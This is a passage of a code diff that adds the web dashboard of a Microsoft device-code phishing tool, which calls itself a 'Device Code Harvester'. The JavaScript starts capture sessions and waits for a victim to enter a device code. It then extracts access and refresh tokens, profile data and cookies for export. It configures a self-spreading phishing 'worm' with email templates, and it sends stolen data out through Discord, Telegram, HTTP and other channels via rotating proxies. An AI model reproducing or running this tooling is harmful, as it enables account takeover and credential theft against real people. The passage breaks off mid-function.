+                <label>📤 Exfiltration Configuration (JSON)</label>
+                <textarea id="exfilConfig" rows="6" placeholder='{"channels":[{"type":"http","url":"https://your-server.com/collect"}]}'></textarea>
+                <small class="text-muted">Supported: http, discord, telegram, smtp, dns, s3, websocket, mqtt</small>
+            </div>
+            <div class="form-group mt-10">
+                <label>🔐 AES-256 Encryption Key</label>
+                <input type="text" id="encryptionKey" placeholder="64-character hex key (leave empty to disable)">
+                <small class="text-muted">Generate with: python -c "import os; print(os.urandom(32).hex())"</small>
+            </div>
+            <div class="form-group mt-10">
+                <label>🤖 Telegram Bot Token</label>
+                <input type="text" id="telegramBotToken" placeholder="TELEGRAM_BOT_TOKEN">
+                <small class="text-muted">If configured, Telegram can be tested directly from the dashboard.</small>
+            </div>
+            <div class="form-group mt-10">
+                <label>💬 Telegram Chat ID</label>
+                <input type="text" id="telegramChatId" placeholder="TELEGRAM_CHAT_ID">
+                <small class="text-muted">Use -100... for channels or the chat ID for users/groups.</small>
+            </div>
+            <div class="form-group mt-10">
+                <label>🔗 Discord Webhook URL</label>
+                <input type="text" id="discordWebhookUrl" placeholder="https://discord.com/api/webhooks/....">
+                <small class="text-muted">Paste your Discord webhook URL here.</small>
+            </div>
+            <div class="flex mt-20" style="gap:12px; flex-wrap:wrap;">
+                <button id="saveExfilSettingsBtn" class="btn btn-primary" onclick="saveExfilSettings(event)">💾 Save Exfil Settings</button>
+                <button id="testExfilSettingsBtn" class="btn btn-info" onclick="testExfilSettings(event)">🧪 Test Exfil Settings</button>
+                <button id="testTelegramWebhookBtn" class="btn btn-info" onclick="testWebhookChannel(event, 'telegram')">📨 Test Telegram</button>
+                <button id="testDiscordWebhookBtn" class="btn btn-info" onclick="testWebhookChannel(event, 'discord')">💬 Test Discord</button>
+                <button id="validateExfilSettingsBtn" class="btn btn-secondary" onclick="validateExfilSettings(event)">✅ Validate Exfil Settings</button>
+            </div>
+            <div id="exfilTestResult" class="card" style="margin-top:16px; display:none;">
+                <div class="card-header" style="display:flex; align-items:center; gap:12px;"><strong>Exfil Test Result</strong><span id="exfilTestBadge" class="badge badge-info">PENDING</span></div>
+                <div class="card-body" id="exfilTestResultBody">No test run yet.</div>
+            </div>
+        </div>
+        
+        <!-- Profile Tab -->
+        <div id="profileTab" class="tab-content">
+            <div class="flex" style="margin-bottom: 16px;">
+                <input type="text" id="newProfileName" placeholder="Profile name" style="flex: 1;">
+                <button class="btn btn-primary" onclick="saveCurrentProfile()">💾 Save Profile</button>
+            </div>
+            <div id="profilesList"></div>
+            <div class="flex mt-20">
+                <button class="btn btn-secondary" onclick="exportAllProfiles()">📤 Export All Profiles</button>
+                <button class="btn btn-secondary" onclick="importProfiles()">📥 Import Profiles</button>
+                <button class="btn btn-secondary" onclick="refreshProfilesList()">🔄 Refresh List</button>
+            </div>
+        </div>
+        
+        <div class="flex mt-20">
+            <button class="btn btn-secondary" onclick="closeSettingsModal()">Close</button>
+            <button class="btn btn-danger" style="margin-left:8px;" onclick="confirmClearOverrides()">🧹 Clear Runtime Overrides</button>
+        </div>
+    </div>
+</div>
+
+<script>
+// ==================== GLOBAL VARIABLES ====================
+let eventSource = null;
+let currentSessionId = null;
+let currentSessionData = null;
+
+// ==================== INITIALIZATION ====================
+document.addEventListener('DOMContentLoaded', function() {
+    refreshAllStats();
+    checkWormStatus();
+    loadSettings();
+    refreshProfilesList();
+    startStatusPolling();
+    refreshProxyCount();
+    refreshProxyStatus();
+    setInterval(refreshAllStats, 30000);
+}, { once: true });
+
+async function loadProxyListFromServer() {
+    try {
+        const data = await apiGet('/api/config/list');
+        if (data && data.current && data.current.proxy_list !== undefined) {
+            document.getElementById('proxyList').value = data.current.proxy_list || '';
+            showStatus('Loaded proxy list from server', 'success');
+            refreshProxyCount();
+            refreshProxyStatus();
+        } else {
+            showStatus('No proxy list available on server', 'error');
+        }
+    } catch (e) {
+        showStatus('Failed to load proxy list: ' + e.message, 'error');
+    }
+}
+
+// ==================== API HELPERS ====================
+async function apiGet(url) {
+    try {
+        const response = await fetch(url);
+        if (!response.ok) return null;
+        return await response.json();
+    } catch (e) {
+        console.error('API GET error:', e);
+        return null;
+    }
+}
+
+async function apiPost(url, data) {
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+        return await response.json();
+    } catch (e) {
+        console.error('API POST error:', e);
+        return null;
+    }
+}
+
+// ==================== UI HELPERS ====================
+function addLog(message, level = 'info') {
+    const container = document.getElementById('logContainer');
+    if (!container) return;
+    
+    const entry = document.createElement('div');
+    entry.className = `log-entry log-${level}`;
+    entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+    container.appendChild(entry);
+    entry.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+}
+
+function showStatus(message, type = 'info') {
+    const statusBar = document.getElementById('statusBar');
+    statusBar.textContent = message;
+    statusBar.className = '';
+    statusBar.classList.add(type === 'success' ? 'badge-success' : (type === 'error' ? 'badge-danger' : 'badge-info'));
+    statusBar.style.display = 'block';
+    statusBar.style.padding = '12px 16px';
+    statusBar.style.borderRadius = '8px';
+    statusBar.style.marginBottom = '20px';
+    
+    setTimeout(() => {
+        statusBar.style.display = 'none';
+    }, 5000);
+}
+
+function extractValidationDetails(data) {
+    const result = {
+        summary: 'Unknown validation failure',
+        full: JSON.stringify(data, null, 2)
+    };
+
+    if (!data) {
+        return result;
+    }
+
+    if (data.error) {
+        result.summary = data.error;
+    } else if (data.results) {
+        const channelErrors = [];
+        for (const [channel, info] of Object.entries(data.results)) {
+            if (info.valid === false) {
+                channelErrors.push(`${channel}: ${info.error || 'invalid configuration'}`);
+            }
+        }
+        if (channelErrors.length) {
+            result.summary = channelErrors.join('; ');
+            result.full = `${result.summary}\n\n${JSON.stringify(data.results, null, 2)}`;
+        }
+    }
+
+    return result;
+}
+
+function copyToClipboard(elementId) {
+    const element = document.getElementById(elementId);
+    const text = element.textContent;
+    navigator.clipboard.writeText(text);
+    addLog('Copied to clipboard', 'success');
+    showStatus('Copied to clipboard!', 'success');
+}
+
+function toggleCollapse(collapseId) {
+    const element = document.getElementById(collapseId);
+    const header = element.previousElementSibling;
+    if (element.classList.contains('hidden')) {
+        element.classList.remove('hidden');
+        header.innerHTML = header.innerHTML.replace('▶', '▼');
+    } else {
+        element.classList.add('hidden');
+        header.innerHTML = header.innerHTML.replace('▼', '▶');
+    }
+}
+
+// ==================== STATISTICS ====================
+async function refreshAllStats() {
+    try {
+        const data = await apiGet('/api/worm/status');
+        if (data) {
+            document.getElementById('statPhished').textContent = data.phished_count || 0;
+            document.getElementById('statCaptured').textContent = data.captured_count || 0;
+            document.getElementById('statSessions').textContent = currentSessionId ? 1 : 0;
+            
+            // Update worm indicator
+            const indicator = document.getElementById('wormIndicator');
+            if (indicator) {
+                if (data.enabled) {
+                    indicator.className = 'badge badge-success';
+                    indicator.innerHTML = `🐛 Worm: <strong>ENABLED</strong> | Phished: ${data.phished_count || 0} | Captured: ${data.captured_count || 0}`;
+                } else {
+                    indicator.className = 'badge badge-warning';
+                    indicator.innerHTML = '🐛 Worm: DISABLED';
+                }
+            }
+        }
+    } catch (e) {
+        console.error('Stats refresh failed:', e);
+    }
+}
+
+// ==================== CAPTURE FUNCTIONS ====================
+async function startCapture() {
+    const btn = document.getElementById('startBtn');
+    btn.disabled = true;
+    btn.textContent = '⏳ Starting...';
+    
+    document.getElementById('captureCard').classList.remove('hidden');
+    document.getElementById('resultsCard').classList.add('hidden');
+    document.getElementById('deviceCodeArea').classList.add('hidden');
+    document.getElementById('logContainer').innerHTML = '';
+    document.getElementById('captureStatus').innerHTML = 'Initializing capture session...';
+    
+    const payload = {
+        client_id: document.getElementById('clientId').value,
+        tenant: document.getElementById('tenant').value,
+        scope: document.getElementById('scope').value,
+        max_endpoints: parseInt(document.getElementById('maxEndpoints').value) || 4,
+        refresh: document.getElementById('refreshToken').checked,
+        detect_ca: document.getElementById('detectCA').checked
+    };
+    
+    if (!payload.client_id) {
+        showStatus('Client ID is required!', 'error');
+        btn.disabled = false;
+        btn.textContent = '🚀 Start Capture';
+        return;
+    }
+    
+    try {
+        addLog('Requesting device code from Microsoft...', 'info');
+        const response = await fetch('/api/start-capture', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        
+        const data = await response.json();
+        if (!response.ok) {
+            showStatus('Error: ' + (data.error || 'Unknown error'), 'error');
+            btn.disabled = false;
+            btn.textContent = '🚀 Start Capture';
+            return;
+        }
+        
+        currentSessionId = data.session_id;
+        addLog(`Session created: ${currentSessionId}`, 'success');
+        addLog(`Device code: ${data.user_code}`, 'info');
+        
+        document.getElementById('captureStatus').innerHTML = '<span class="badge badge-success">● Device code obtained. Waiting for victim...</span>';
+        document.getElementById('deviceCodeArea').classList.remove('hidden');
+        document.getElementById('verificationUri').textContent = data.verification_uri;
+        document.getElementById('userCode').textContent = data.user_code;
+        const shareLink = data.share_link || data.verification_uri;
+        const shareLinkElement = document.getElementById('shareLink');
+        shareLinkElement.textContent = shareLink;
+        shareLinkElement.href = shareLink;
+        
+        if (eventSource) eventSource.close();
+        eventSource = new EventSource(`/api/stream/${currentSessionId}`);
+        // Fetch session info to populate proxy display immediately
+        try {
+            fetch(`/api/session-info/${currentSessionId}`).then(async res => {
+                if (!res.ok) return;
+                const info = await res.json();
+                document.getElementById('lastProxy').textContent = info.last_proxy || '-';
+            }).catch(e => console.debug('session-info fetch failed', e));
+        } catch (e) {
+            console.debug('session-info request exception', e);
+        }
+        
+        eventSource.onmessage = function(e) {
+            const msg = JSON.parse(e.data);
+            if (msg.type === 'polling') {
+                document.getElementById('captureStatus').innerHTML = `<span class="badge badge-info">● Polling... (interval: ${msg.interval}s)</span>`;
+            } else if (msg.type === 'token_obtained') {
+                addLog('Token obtained successfully!', 'success');
+                document.getElementById('captureStatus').innerHTML = '<span class="badge badge-success">● Token captured! Extracting data...</span>';
+                eventSource.close();
+                finalizeCapture(currentSessionId);
+            } else if (msg.type === 'proxy') {
+                // server can emit proxy updates
+                document.getElementById('lastProxy').textContent = msg.proxy || '-';
+            } else if (msg.type === 'error') {
+                addLog(`Polling error: ${msg.message}`, 'error');
+                showStatus(`Polling error: ${msg.message}`, 'error');
+                eventSource.close();
+                btn.disabled = false;
+                btn.textContent = '🚀 Start Capture';
+            }
+        };
+        
+        eventSource.onerror = function() {
+            addLog('EventSource connection error', 'error');
+        };
+        
+    } catch (e) {
+        showStatus('Error: ' + e.message, 'error');
+        addLog(`Capture failed: ${e.message}`, 'error');
+    } finally {
+        btn.disabled = false;
+        btn.textContent = '🚀 Start Capture';
+    }
+}
+
+function openShareLink() {
+    const shareLinkElement = document.getElementById('shareLink');
+    const url = shareLinkElement.textContent || shareLinkElement.href;
+    if (!url || url === '#') {
+        showStatus('Share link is not available yet.', 'error');
+        return;
+    }
+    window.open(url, '_blank', 'noopener');
+}
+
+async function finalizeCapture(sessionId) {
+    addLog('Extracting user profile and cookies...', 'info');
+    
+    try {
+        const response = await fetch(`/api/finalize/${sessionId}`, { method: 'POST' });
+        const data = await response.json();
+        
+        if (!response.ok) {
+            showStatus('Extraction failed: ' + (data.error || 'Unknown'), 'error');
+            return;
+        }
+        
+        addLog('Capture complete! Processing results...', 'success');
+        showStatus('Capture complete! Review results below.', 'success');
+        displayResults(data);
+        refreshAllStats();
+        
+    } catch (e) {
+        addLog(`Extraction error: ${e.message}`, 'error');
+    }
+}
+
+// ==================== DISPLAY RESULTS ====================
+function displayResults(data) {
+    currentSessionData = data.session;
+    
+    // Tokens
+    const tokens = data.session.tokens;
+    let tokensHtml = '';
+    for (const [key, value] of Object.entries(tokens)) {
+        const displayValue = value && value.length > 100 ? value.substring(0, 100) + '...' : (value || 'N/A');
+        tokensHtml += `<div style="margin-bottom: 8px;"><strong>${key}:</strong><br><code style="font-size: 0.75rem; word-break: break-all;">${JSON.stringify(displayValue)}</code></div>`;
+    }
+    document.getElementById('tokensContent').innerHTML = tokensHtml;
+    
+    // User Info
+    const user = data.session.user;
+    let userHtml = '<div class="grid-2">';
+    for (const [key, value] of Object.entries(user)) {
+        if (value) userHtml += `<div><strong>${key}:</strong><br>${value}</div>`;
+    }
+    userHtml += '</div>';
+    document.getElementById('userContent').innerHTML = userHtml || '<p class="text-muted">No user information available</p>';
+    
+    // Cookies
+    document.getElementById('cookieCount').textContent = data.session.cookie_count;
+    let cookiesHtml = '';
+    for (const cookie of data.session.cookies) {
+        cookiesHtml += `<div>${cookie.domain} | ${cookie.name}: ${cookie.value.substring(0, 50)}...</div>`;
+    }
+    document.getElementById('cookiesContent').innerHTML = cookiesHtml || '<p class="text-muted">No cookies harvested</p>';
+    
+    // Conditional Access
+    if (data.ca_analysis && data.ca_analysis.length > 0) {
+        let caHtml = '';
+        for (const item of data.ca_analysis) {
+            caHtml += `<div class="badge badge-info" style="margin: 4px;">🔒 ${item}</div>`;
+        }
+        document.getElementById('caContent').innerHTML = caHtml;
+    } else {
+        document.getElementById('caContent').innerHTML = '<p class="text-muted">No Conditional Access indicators detected</p>';
+    }
+    
+    // Exfiltration Results
+    if (data.exfil_results && Object.keys(data.exfil_results).length > 0) {
+        let exfilHtml = '';
+        for (const [channel, success] of Object.entries(data.exfil_results)) {
+            const status = success ? '✅ Success' : '❌ Failed';
+            exfilHtml += `<div>${channel}: ${status}</div>`;
+        }
+        document.getElementById('exfilContent').innerHTML = exfilHtml;
+    } else {
+        document.getElementById('exfilContent').innerHTML = '<p class="text-muted">No exfiltration channels configured</p>';
+    }
+    
+    // Full Session
+    document.getElementById('fullContent').textContent = JSON.stringify(data.session, null, 2);
+    
+    document.getElementById('resultsCard').classList.remove('hidden');
+    document.getElementById('resultsCard').scrollIntoView({ behavior: 'smooth' });
+}
+
+// ==================== EXPORT FUNCTIONS ====================
+function exportCookiesNetscape() {
+    if (!currentSessionData || !currentSessionData.cookies) return;
+    let lines = ['# Netscape HTTP Cookie File', '# Generated by Device Code Harvester'];
+    for (const c of currentSessionData.cookies) {
+        const domain = c.domain || '.microsoftonline.com';
+        const domainFlag = domain.startsWith('.') ? 'TRUE' : 'FALSE';
+        const secure = c.secure ? 'TRUE' : 'FALSE';
+        const expiry = c.expirationDate ? Math.floor(c.expirationDate) : '0';
+        lines.push(`${domain}\t${domainFlag}\t${c.path || '/'}\t${secure}\t${expiry}\t${c.name}\t${c.value}`);
+    }
+    downloadFile(lines.join('\n'), 'cookies_netscape.txt', 'text/plain');
+}
+
+function exportCookiesJSON() {
+    if (!currentSessionData) return;
+    downloadFile(JSON.stringify(currentSessionData.cookies, null, 2), 'cookies.json', 'application/json');
+}
+
+function downloadSession() {
+    if (!currentSessionData) return;
+    downloadFile(JSON.stringify(currentSessionData, null, 2), 'session_full.json', 'application/json');
+}
+
+function downloadFullReport() {
+    if (!currentSessionData) return;
+    const report = {
+        timestamp: new Date().toISOString(),
+        session: currentSessionData,
+        summary: {
+            user: currentSessionData.user.upn || currentSessionData.user.email,
+            cookie_count: currentSessionData.cookie_count,
+            has_refresh_token: !!currentSessionData.tokens.refresh_token
+        }
+    };
+    downloadFile(JSON.stringify(report, null, 2), `report_${Date.now()}.json`, 'application/json');
+}
+
+function copyFullSession() {
+    if (!currentSessionData) return;
+    navigator.clipboard.writeText(JSON.stringify(currentSessionData, null, 2));
+    addLog('Full session copied to clipboard', 'success');
+}
+
+function downloadFile(content, filename, mimeType) {
+    const blob = new Blob([content], { type: mimeType });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = filename;
+    a.click();
+    URL.revokeObjectURL(url);
+}
+
+// ==================== CONFIGURATION MANAGEMENT ====================
+async function loadSettings() {
+    try {
+        // Load worm config
+        const response = await fetch('/api/worm/config');
+        if (response.ok) {
+            const data = await response.json();
+            document.getElementById('wormEnabled').checked = data.enabled;
+            document.getElementById('wormEnabledLabel').textContent = data.enabled ? 'Enabled' : 'Disabled';
+            document.getElementById('wormMaxDepth').value = data.max_depth;
+            document.getElementById('wormMaxTargets').value = data.max_targets;
+            document.getElementById('wormParallelPollers').value = data.parallel_pollers;
+            document.getElementById('wormMinDelay').value = data.min_email_delay;
+            document.getElementById('wormMaxDelay').value = data.max_email_delay;
+            document.getElementById('wormMinScore').value = data.min_score_threshold;
+            document.getElementById('wormHtmlTemplate').value = data.html_template;
+            document.getElementById('wormTxtTemplate').value = data.txt_template;
+            document.getElementById('wormTargetDomain').value = data.target_domain;
+        }
+        
+        // Load runtime overrides
+        loadRuntimeOverrides();
+    } catch (e) {
+        console.error('Failed to load settings:', e);
+        addLog('Failed to load settings: ' + e.message, 'warning');
+    }
+}
+
+async function loadRuntimeOverrides() {
+    const container = document.getElementById('runtimeOverridesContent');
+    if (!container) return;
+    container.textContent = 'Loading...';
+    try {
+        const resp = await fetch('/api/runtime-overrides');
+        if (!resp.ok) {
+            container.textContent = 'Failed to load overrides';
+            return;
+        }
+        const data = await resp.json();
+        const overrides = data.overrides || {};
+        if (Object.keys(overrides).length === 0) {
+            container.textContent = 'No runtime overrides present';
+            return;
+        }
+        container.textContent = JSON.stringify(overrides, null, 2);
+        // prepare editor
+        const editor = document.getElementById('runtimeOverridesEditor');
+        if (editor) editor.value = JSON.stringify(overrides, null, 2);
+        applyOverridesToUI(overrides);
+    } catch (e) {
+        container.textContent = 'Error loading overrides: ' + e.message;
+    }
+}
+
+function toggleEditOverrides() {
+    const content = document.getElementById('runtimeOverridesContent');
+    const editor = document.getElementById('runtimeOverridesEditor');
+    const editBtn = document.getElementById('editOverridesBtn');
+    const saveBtn = document.getElementById('saveOverridesBtn');
+    const cancelBtn = document.getElementById('cancelOverridesBtn');
+    if (!editor || !content) return;
+    if (editor.classList.contains('hidden')) {
+        editor.classList.remove('hidden');
+        saveBtn.classList.remove('hidden');
+        cancelBtn.classList.remove('hidden');
+        content.classList.add('hidden');
+        editBtn.textContent = 'Preview';
+    } else {
+        editor.classList.add('hidden');
+        saveBtn.classList.add('hidden');
+        cancelBtn.classList.add('hidden');
+        content.classList.remove('hidden');
+        editBtn.textContent = '✏️ Edit';
+    }
+}
+
+function cancelEditOverrides() {
+    toggleEditOverrides();
+}
+
+async function saveRuntimeOverrides() {
+    const editor = document.getElementById('runtimeOverridesEditor');
+    if (!editor) return;
+    let parsed;
+    try {
+        parsed = JSON.parse(editor.value);
+    } catch (e) {
+        showStatus('Invalid JSON: ' + e.message, 'error');
+        return;
+    }
+    try {
+        const resp = await fetch('/api/runtime-overrides', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ overrides: parsed })
+        });
+        const data = await resp.json();
+        if (resp.ok && data.success) {
+            showStatus('Runtime overrides saved', 'success');
+            addLog('Runtime overrides saved', 'success');
+            // Apply to UI immediately
+            applyOverridesToUI(parsed);
+            toggleEditOverrides();
+            loadRuntimeOverrides();
+        } else {
+            showStatus('Failed to save overrides: ' + (data.error || 'unknown'), 'error');
+        }
+    } catch (e) {
+        showStatus('Error saving overrides: ' + e.message, 'error');
+    }
+}
+
+function applyOverridesToUI(overrides) {
+    if (!overrides || typeof overrides !== 'object') return;
+    // Map environment keys to UI fields
+    if (overrides.CLIENT_ID !== undefined) document.getElementById('clientId').value = overrides.CLIENT_ID || '';
+    if (overrides.TENANT !== undefined) document.getElementById('tenant').value = overrides.TENANT || 'common';
+    if (overrides.SCOPES !== undefined) document.getElementById('scope').value = overrides.SCOPES || overrides.SCOPES;
+    if (overrides.SCOPE !== undefined) document.getElementById('scope').value = overrides.SCOPE || overrides.SCOPE;
+    if (overrides.MAX_ENDPOINTS !== undefined) document.getElementById('maxEndpoints').value = overrides.MAX_ENDPOINTS;
+    if (overrides.REFRESH_TOKEN !== undefined) document.getElementById('refreshToken').checked = String(overrides.REFRESH_TOKEN) === 'true' || overrides.REFRESH_TOKEN === true;
+    if (overrides.DETECT_CA !== undefined) document.getElementById('detectCA').checked = String(overrides.DETECT_CA) === 'true' || overrides.DETECT_CA === true;
+    if (overrides.PROXY_LIST !== undefined) document.getElementById('proxyList').value = overrides.PROXY_LIST || '';
+    if (overrides.PLAYWRIGHT !== undefined) {
+        const val = String(overrides.PLAYWRIGHT).toLowerCase();
+        const checked = (val === 'true' || val === '1');
+        const el = document.getElementById('playwrightEnabled');
+        if (el) el.checked = checked;
+        const lbl = document.getElementById('playwrightLabel');
+        if (lbl) lbl.textContent = checked ? 'Enabled' : 'Disabled';
+    }
+    if (overrides.WORM_ENABLED !== undefined) {
+        const val = String(overrides.WORM_ENABLED).toLowerCase();
+        const checked = (val === 'true' || val === '1');
+        const el = document.getElementById('wormEnabled');
+        if (el) el.checked = checked;
+        const lbl = document.getElementById('wormEnabledLabel');
+        if (lbl) lbl.textContent = checked ? 'Enabled' : 'Disabled';
+    }
+    if (overrides.WORM_MAX_DEPTH !== undefined) document.getElementById('wormMaxDepth').value = overrides.WORM_MAX_DEPTH;
+    if (overrides.WORM_MAX_TARGETS !== undefined) document.getElementById('wormMaxTargets').value = overrides.WORM_MAX_TARGETS;
+    if (overrides.WORM_PARALLEL_POLLERS !== undefined) document.getElementById('wormParallelPollers').value = overrides.WORM_PARALLEL_POLLERS;
+    if (overrides.WORM_MIN_EMAIL_DELAY !== undefined) document.getElementById('wormMinDelay').value = overrides.WORM_MIN_EMAIL_DELAY;
+    if (overrides.WORM_MAX_EMAIL_DELAY !== undefined) document.getElementById('wormMaxDelay').value = overrides.WORM_MAX_EMAIL_DELAY;
+    if (overrides.WORM_HTML_TEMPLATE !== undefined) document.getElementById('wormHtmlTemplate').value = overrides.WORM_HTML_TEMPLATE;
+    if (overrides.WORM_TXT_TEMPLATE !== undefined) document.getElementById('wormTxtTemplate').value = overrides.WORM_TXT_TEMPLATE;
+    if (overrides.EXFIL_CONFIG !== undefined) document.getElementById('exfilConfig').value = overrides.EXFIL_CONFIG || '';
+    if (overrides.ENCRYPTION_KEY !== undefined) document.getElementById('encryptionKey').value = overrides.ENCRYPTION_KEY || '';
+    if (overrides.TELEGRAM_BOT_TOKEN !== undefined) document.getElementById('telegramBotToken').value = overrides.TELEGRAM_BOT_TOKEN || '';
+    if (overrides.TELEGRAM_CHAT_ID !== undefined) document.getElementById('telegramChatId').value = overrides.TELEGRAM_CHAT_ID || '';
+    if (overrides.DISCORD_WEBHOOK_URL !== undefined) document.getElementById('discordWebhookUrl').value = overrides.DISCORD_WEBHOOK_URL || '';
+}
+
+async function saveWormSettings(event) {
+    const settings = {
+        max_depth: parseInt(document.getElementById('wormMaxDepth').value),
+        max_targets: parseInt(document.getElementById('wormMaxTargets').value),
+        parallel_pollers: parseInt(document.getElementById('wormParallelPollers').value),
+        min_email_delay: parseInt(document.getElementById('wormMinDelay').value),
+        max_email_delay: parseInt(document.getElementById('wormMaxDelay').value),
+        min_score_threshold: parseInt(document.getElementById('wormMinScore').value),
+        enabled: document.getElementById('wormEnabled').checked
+    };
+    
+    // Validate settings
+    if (settings.max_depth < 1 || settings.max_depth > 5) {
+        showStatus('Max depth must be between 1 and 5', 'error');
+        return;
+    }
+    if (settings.min_email_delay >= settings.max_email_delay) {
+        showStatus('Min delay must be less than max delay', 'error');
+        return;
+    }
+    
+    try {
+        const btn = event.target;
+        btn.disabled = true;
+        btn.textContent = '⏳ Saving...';
+        
+        const response = await fetch('/api/worm/config/update', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(settings)
+        });
+        const data = await response.json();
+        
+        if (response.ok && data.success) {
+            showStatus('✅ Worm settings saved and applied immediately!', 'success');
+            addLog('Worm settings saved: ' + data.changes.join(', '), 'success');
+            checkWormStatus();
+        } else {
+            showStatus('❌ Failed to save worm settings: ' + (data.error || 'unknown'), 'error');
+        }
+    } catch (e) {
+        showStatus('❌ Error saving settings: ' + e.message, 'error');
+    } finally {
+        const btn = event ? event.target : document.getElementById('saveWormSettingsBtn');
+        if (btn) {
+            btn.disabled = false;
+            btn.textContent = '💾 Save Worm Settings';
+        }
+    }
+}
+
+async function saveProxySettings(event) {
+    const proxy_list = document.getElementById('proxyList').value.trim();
+    
+    // Validate proxy format if present
+    if (proxy_list) {
+        const proxies = proxy_list.split(',').map(p => p.trim());
+        for (const p of proxies) {
+            if (!p.match(/^https?:\/\//)) {
+                showStatus('Invalid proxy format. Must start with http:// or https://', 'error');
+                return;
+            }
+        }
+    }
+    
+    try {
+        const btn = event.target;
+        btn.disabled = true;
+        btn.textContent = '⏳ Saving...';
+        
+        const response = await fetch('/api/settings/proxy', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ proxy_list })
+        });
+        const data = await response.json();
+        
+        if (response.ok && data.success) {
+            showStatus(`✅ Proxy settings saved! (${data.proxy_count} proxies)`, 'success');
+            addLog('Proxy settings saved and applied', 'success');
+            refreshProxyStatus();
+        } else {
+            showStatus('❌ Failed to save proxy settings', 'error');
+        }
+    } catch (e) {
+        showStatus('❌ Error saving proxy settings: ' + e.message, 'error');
+    } finally {
+        const btn = event?.target || document.getElementById('saveProxySettingsBtn');
+        if (btn) {
+            btn.disabled = false;
+            btn.textContent = '💾 Save Proxy Settings';
+        }
+    }
+}
+
+// ==================== PROXY TESTING / COUNT ====================
+async function refreshProxyCount() {
+    try {
+        const data = await apiGet('/api/proxy/count');
+        if (data && typeof data.count !== 'undefined') {
+            document.getElementById('proxyCount').textContent = data.count;
+        } else {
+            document.getElementById('proxyCount').textContent = '0';
+        }
+    } catch (e) {
+        console.error('Failed to refresh proxy count', e);
+    }
+}
+
+async function refreshProxyStatus() {
+    try {
+        const data = await apiGet('/api/proxy/status');
+        if (data) {
+            document.getElementById('proxyStatusCount').textContent = data.proxy_count ?? 0;
+            document.getElementById('proxyStatusNext').textContent = data.next_proxy || 'N/A';
+            document.getElementById('proxyStatusIndex').textContent = typeof data.next_index === 'number' ? data.next_index : '0';
+            document.getElementById('proxyCount').textContent = data.proxy_count ?? document.getElementById('proxyCount').textContent;
+        }
+    } catch (e) {
+        console.error('Failed to refresh proxy status', e);
+    }
+}
+
+async function testProxy(event) {
+    const btn = document.getElementById('testProxyBtn') || (event && event.target);
+    if (btn) { btn.disabled = true; btn.textContent = '⏳ Testing...'; }
+    const card = document.getElementById('proxyTestResult');
+    const body = document.getElementById('proxyTestResultBody');
+    const badge = document.getElementById('proxyTestBadge');
+    try {
+        if (card) card.style.display = 'block';
+        if (badge) { badge.textContent = 'RUNNING'; badge.className = 'badge badge-info'; }
+        const resp = await fetch('/api/proxy/test', { method: 'POST' });
+        const data = await resp.json();
+        if (resp.ok && data.connected) {
+            if (badge) { badge.textContent = 'SUCCESS'; badge.className = 'badge badge-success'; }
+            body.textContent = `Proxy tested: ${data.proxy_tested || ''}\nExit IP: ${data.exit_ip || ''}`;
+        } else {
+            if (badge) { badge.textContent = 'FAILED'; badge.className = 'badge badge-danger'; }
+            body.textContent = `Failed: ${data.message || data.error || 'unknown'}`;
+        }
+    } catch (e) {
+        if (badge) { badge.textContent = 'ERROR'; badge.className = 'badge badge-danger'; }
+        if (body) body.textContent = 'Error testing proxy: ' + e.message;
+    } finally {
+        if (btn) { btn.disabled = false; btn.textContent = '🧪 Test Proxy'; }
+        refreshProxyStatus();
+    }
+}
+
+async function getNextProxy() {
+    try {
+        const data = await apiGet('/api/proxy/next');
+        if (data && data.proxy) {
+            showStatus('Next proxy: ' + data.proxy, 'info');
+            addLog('Next proxy: ' + data.proxy, 'info');
+        } else {
+            showStatus('No proxies configured', 'error');
+        }
+    } catch (e) {
+        showStatus('Failed to get next proxy: ' + e.message, 'error');
+    } finally {
+        refreshProxyStatus();
+    }
+}
+
+async function saveExfilSettings(event) {
+    const exfil_config = document.getElementById('exfilConfig').value.trim();
+    const encryption_key = document.getElementById('encryptionKey').value.trim();
+    const telegram_bot_token = document.getElementById('telegramBotToken').value.trim();
+    const telegram_chat_id = document.getElementById('telegramChatId').value.trim();
+    const discord_webhook_url = document.getElementById('discordWebhookUrl').value.trim();
+    
+    // Validate JSON
+    if (exfil_config) {
+        try {
+            JSON.parse(exfil_config);
+        } catch (e) {
+            showStatus('Invalid JSON in exfil config: ' + e.message, 'error');
+            return;
+        }
+    }
+    
+    // Validate encryption key format
+    if (encryption_key && !encryption_key.match(/^[0-9a-fA-F]+$/)) {
+        showStatus('Encryption key must be hex format (0-9, a-f)', 'error');
+        return;
+    }
+    
+    try {
+        const btn = event.target;
+        btn.disabled = true;
+        btn.textContent = '⏳ Saving...';
+        
+        const response = await fetch('/api/settings/exfil', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                exfil_config,
+                encryption_key,
+                telegram_bot_token,
+                telegram_chat_id,
+                discord_webhook_url
+            })
+        });
+        const data = await response.json();
+        
+        if (response.ok && data.success) {
+            showStatus(`✅ Exfil settings saved! (${data.channels_configured} channels)`, 'success');
+            addLog('Exfil settings saved and applied', 'success');
+        } else {
+            showStatus('❌ Failed: ' + (data.error || 'unknown'), 'error');
+        }
+    } catch (e) {
+        showStatus('❌ Error saving exfil settings: ' + e.message, 'error');
+    } finally {
+        const btn = event?.target || document.getElementById('saveExfilSettingsBtn');
+        if (btn) {
+            btn.disabled = false;
+            btn.textContent = '💾 Save Exfil Settings';
+        }
+    }
+}
+
+async function testExfilSettings(event) {
+    try {
+        const btn = event.target;
+        btn.disabled = true;
+        btn.textContent = '⏳ Testing...';
+
+        const resultCard = document.getElementById('exfilTestResult');
+        const badge = document.getElementById('exfilTestBadge');
+        resultCard.classList.remove('test-result-success', 'test-result-failure', 'test-result-running');
+        resultCard.classList.add('test-result-running');
+        badge.classList.remove('badge-success', 'badge-danger', 'badge-info');
